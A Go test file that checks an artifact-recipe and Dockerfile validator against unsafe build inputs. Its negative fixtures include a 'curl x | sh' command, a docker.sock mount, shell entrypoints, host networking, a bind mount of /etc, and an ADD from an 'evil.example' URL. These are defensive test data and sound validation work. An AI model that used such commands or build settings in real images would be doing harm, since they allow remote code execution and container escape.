package toolhub

import (
	"archive/tar"
	"bytes"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"io"
	"strings"
	"testing"
)

func recipeFixture(t *testing.T, dockerfile string) (ArtifactRecipe, []byte) {
	t.Helper()
	base := "example/runtime@sha256:" + strings.Repeat("a", 64)
	r := ArtifactRecipe{Format: "dockerfile-v1", Dockerfile: "Dockerfile", DependencyLocks: []string{"dependencies.lock"}, BaseImages: []string{base}, Entrypoint: []string{"/app/server"}}
	var contextBytes bytes.Buffer
	w := tar.NewWriter(&contextBytes)
	for _, file := range []struct{ name, content string }{{"Dockerfile", dockerfile}, {"dependencies.lock", "pinned-dependency-fixture"}, {"server.go", "package main"}} {
		r.Files = append(r.Files, ArtifactFile{Path: file.name, Digest: fmt.Sprintf("sha256:%x", sha256.Sum256([]byte(file.content)))})
		if err := w.WriteHeader(&tar.Header{Name: file.name, Mode: 0644, Size: int64(len(file.content)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(file.content)); err != nil {
			t.Fatal(err)
		}
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	return r, contextBytes.Bytes()
}

func TestArtifactRecipeRejectsMissingOrMutableInputs(t *testing.T) {
	r, _ := recipeFixture(t, "")
	data, _ := json.Marshal(r)
	if _, err := ParseArtifactRecipe(data); err != nil {
		t.Fatal(err)
	}
	for _, change := range []func(*ArtifactRecipe){
		func(r *ArtifactRecipe) { r.Format = "shell" },
		func(r *ArtifactRecipe) { r.Dockerfile = "../Dockerfile" },
		func(r *ArtifactRecipe) { r.Dockerfile = "missing" },
		func(r *ArtifactRecipe) { r.Files = nil },
		func(r *ArtifactRecipe) { r.Files[0].Digest = "latest" },
		func(r *ArtifactRecipe) { r.Files[0].Path = ".env" },
		func(r *ArtifactRecipe) { r.Files = append(r.Files, r.Files[0]) },
		func(r *ArtifactRecipe) { r.DependencyLocks = nil },
		func(r *ArtifactRecipe) { r.DependencyLocks = []string{"missing"} },
		func(r *ArtifactRecipe) { r.DependencyLocks = append(r.DependencyLocks, r.DependencyLocks[0]) },
		func(r *ArtifactRecipe) { r.BaseImages = []string{"python:latest"} },
		func(r *ArtifactRecipe) { r.BaseImages = append(r.BaseImages, r.BaseImages[0]) },
		func(r *ArtifactRecipe) { r.Entrypoint = nil },
		func(r *ArtifactRecipe) { r.Entrypoint = []string{"sh", "-c", "x"} },
		func(r *ArtifactRecipe) { r.Entrypoint = []string{"cmd.exe", "/c", "x"} },
		func(r *ArtifactRecipe) { r.Entrypoint = []string{"powershell.exe", "x"} },
		func(r *ArtifactRecipe) { r.Entrypoint = []string{"script.bat"} },
		func(r *ArtifactRecipe) { r.Entrypoint = []string{"script.cmd"} },
		func(r *ArtifactRecipe) { r.Entrypoint = append(r.Entrypoint, "${TOKEN}") },
		func(r *ArtifactRecipe) { r.Entrypoint = append(r.Entrypoint, "line\nargument") },
	} {
		copyRecipe := r
		copyRecipe.Files = append([]ArtifactFile(nil), r.Files...)
		change(&copyRecipe)
		if err := copyRecipe.Validate(); err == nil {
			t.Fatalf("accepted invalid recipe %+v", copyRecipe)
		}
	}
	for _, input := range [][]byte{[]byte("malformed"), append(data, data...), bytes.Repeat([]byte{' '}, (1<<20)+1), []byte(`{"format":"dockerfile-v1","privileged":true}`), []byte(`{"shell_command":"curl x | sh"}`), []byte(`{"mounts":["/var/run/docker.sock"]}`)} {
		if _, err := ParseArtifactRecipe(input); err == nil {
			t.Fatal("accepted unsupported recipe document")
		}
	}
}

func TestArtifactRecipeContextAndDockerfileDrift(t *testing.T) {
	base := "example/runtime@sha256:" + strings.Repeat("a", 64)
	valid := "FROM " + base + " AS build\nWORKDIR /app\nCOPY . /app\nRUN [\"go\",\"build\",\"-o\",\"/app/server\"]\nFROM scratch\nCOPY --from=build /app/server /app/server\nUSER 10001:10001\nENTRYPOINT [\"/app/server\"]\n"
	r, contextBytes := recipeFixture(t, valid)
	if err := r.VerifyContext(contextBytes); err != nil {
		t.Fatal(err)
	}
	for _, mutate := range []func(*tar.Header){
		func(h *tar.Header) { h.Mode = 04755 },
		func(h *tar.Header) { h.Uid = 10001 },
		func(h *tar.Header) {
			h.Format = tar.FormatPAX
			h.PAXRecords = map[string]string{"SCHILY.xattr.security.capability": "untrusted"}
		},
	} {
		var changed bytes.Buffer
		reader := tar.NewReader(bytes.NewReader(contextBytes))
		writer := tar.NewWriter(&changed)
		for {
			header, err := reader.Next()
			if err != nil {
				break
			}
			mutate(header)
			if err := writer.WriteHeader(header); err != nil {
				t.Fatal(err)
			}
			if _, err := io.Copy(writer, reader); err != nil {
				t.Fatal(err)
			}
		}
		if err := writer.Close(); err != nil {
			t.Fatal(err)
		}
		if err := r.VerifyContext(changed.Bytes()); err == nil {
			t.Fatal("unsafe context metadata accepted")
		}
	}
	if err := r.VerifyContext(append(append([]byte(nil), contextBytes...), []byte("trailing-unreviewed-archive")...)); err == nil {
		t.Fatal("trailing context accepted")
	}
	for _, cached := range []string{
		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,target=/go/pkg/mod [", 1),
		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,id=mod,target=/go/pkg/mod,sharing=locked --mount=type=cache,target=/root/.cache [", 1),
		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,target=/go/pkg/mod,mode=0755,uid=0,gid=0,readonly [", 1),
	} {
		cachedRecipe, cachedContext := recipeFixture(t, cached)
		if err := cachedRecipe.VerifyContext(cachedContext); err != nil {
			t.Fatalf("rejected cache-mount Dockerfile %q: %v", cached, err)
		}
	}
	for _, bad := range []string{
		"",
		"RUN echo x\n" + valid,
		strings.Replace(valid, base, "example/runtime:latest", 1),
		strings.Replace(valid, "AS build", "AS build extra", 1),
		strings.Replace(valid, "FROM scratch", "FROM "+base+" AS build", 1),
		strings.Replace(valid, "USER 10001:10001", "USER 0:0", 1),
		strings.Replace(valid, "ENTRYPOINT [\"/app/server\"]", "ENTRYPOINT sh -c x", 1),
		strings.Replace(valid, "ENTRYPOINT [\"/app/server\"]", "ENTRYPOINT [\"/app/other\"]", 1),
		strings.Replace(valid, "COPY --from=build", "COPY --from=external", 1),
		strings.Replace(valid, "COPY --from=build", "COPY --chown=10001 --from=external", 1),
		strings.Replace(valid, "RUN [", "RUN --network=host [", 1),
		strings.Replace(valid, "RUN [", "RUN --mount=type=secret [", 1),
		strings.Replace(valid, "RUN [", "RUN --mount=type=bind,source=/etc,target=/x [", 1),
		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,from=build,target=/x [", 1),
		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,target=/x --mount=type=cache,target=../escape [", 1),
		strings.Replace(valid, "RUN [", "RUN --mount=type=cache,target=/x,id=../evil [", 1),
		strings.Replace(valid, "RUN [", "RUN --mount=type=cache [", 1),
		"# syntax=docker/dockerfile:latest\n" + valid,
		strings.Replace(valid, "COPY . /app", "ADD https://evil.example/file /app", 1),
		strings.Replace(valid, "COPY . /app", "VOLUME /spaces", 1),
		strings.Replace(valid, "COPY . /app", "RUN echo \\\nworld", 1),
		strings.Replace(valid, "COPY . /app", "SHELL [\"sh\"]", 1),
		strings.Replace(valid, "COPY . /app", "COPY", 1),
	} {
		badRecipe, badContext := recipeFixture(t, bad)
		if err := badRecipe.VerifyContext(badContext); err == nil {
			t.Fatalf("accepted unsupported Dockerfile %q", bad)
		}
	}
	r.Files[0].Digest = "sha256:" + strings.Repeat("b", 64)
	if err := r.VerifyContext(contextBytes); err == nil {
		t.Fatal("context drift accepted")
	}
	r, _ = recipeFixture(t, valid)
	if err := r.VerifyContext([]byte("malformed")); err == nil {
		t.Fatal("malformed context accepted")
	}
	if err := r.VerifyContext(contextBytes[:600]); err == nil {
		t.Fatal("truncated context accepted")
	}
	r.Files = r.Files[:2]
	if err := r.VerifyContext(contextBytes); err == nil {
		t.Fatal("unlisted context accepted")
	}
	r, _ = recipeFixture(t, valid)
	r.Files = append(r.Files, ArtifactFile{Path: "missing", Digest: r.Files[0].Digest})
	if err := r.VerifyContext(contextBytes); err == nil {
		t.Fatal("missing context accepted")
	}
}
